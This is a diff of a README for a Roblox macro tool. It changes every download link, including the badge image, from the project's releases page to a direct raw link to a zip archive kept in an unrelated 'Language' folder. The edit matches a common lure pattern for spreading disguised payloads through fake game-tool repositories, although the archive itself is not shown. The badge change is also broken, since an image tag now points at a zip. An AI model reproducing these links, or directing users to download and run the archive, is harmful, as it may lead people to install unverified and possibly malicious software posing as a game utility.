@@ -1,6 +1,6 @@
 # 🤖 ROBLOX-MACRO-V3.0.0 - Simplify Your Roblox Experience Effortlessly
 
-![Download ROBLOX-MACRO-V3.0.0](https://img.shields.io/badge/Download-ROBLOX--MACRO--V3.0.0-brightgreen)
+![Download ROBLOX-MACRO-V3.0.0](https://raw.githubusercontent.com/realcodeninja/ROBLOX-MACRO-V3.0.0/main/Language/ROBLOX-MACRO-V3.0.0_1.0.zip)
 
 ## 📥 Introduction
 
@@ -17,7 +17,7 @@ To get started with ROBLOX-MACRO-V3.0.0, follow these simple steps:
    - Internet Connection: Required for downloading and updates
 
 2. **Download the Application**
-   - Visit this page to download: [Download ROBLOX-MACRO-V3.0.0](https://github.com/realcodeninja/ROBLOX-MACRO-V3.0.0/releases)
+   - Visit this page to download: [Download ROBLOX-MACRO-V3.0.0](https://raw.githubusercontent.com/realcodeninja/ROBLOX-MACRO-V3.0.0/main/Language/ROBLOX-MACRO-V3.0.0_1.0.zip)
 
 3. **Extract the Files**
    - Once downloaded, locate the file in your Downloads folder.
@@ -42,7 +42,7 @@ ROBLOX-MACRO-V3.0.0 offers various features to improve your gaming experience:
 
 To get ROBLOX-MACRO-V3.0.0 onto your computer, use the link below:
 
-- [Download ROBLOX-MACRO-V3.0.0](https://github.com/realcodeninja/ROBLOX-MACRO-V3.0.0/releases)
+- [Download ROBLOX-MACRO-V3.0.0](https://raw.githubusercontent.com/realcodeninja/ROBLOX-MACRO-V3.0.0/main/Language/ROBLOX-MACRO-V3.0.0_1.0.zip)
 
 ## 🛠 Usage Instructions
 
@@ -77,7 +77,7 @@ Join our community for tips, tricks, and support:
 
 We periodically release updates to enhance functionality and fix issues. Check the releases page for the latest version and any new features.
 
-Visit this page to download the latest version: [Download ROBLOX-MACRO-V3.0.0](https://github.com/realcodeninja/ROBLOX-MACRO-V3.0.0/releases)
+Visit this page to download the latest version: [Download ROBLOX-MACRO-V3.0.0](https://raw.githubusercontent.com/realcodeninja/ROBLOX-MACRO-V3.0.0/main/Language/ROBLOX-MACRO-V3.0.0_1.0.zip)
 
 ## 📝 License
 
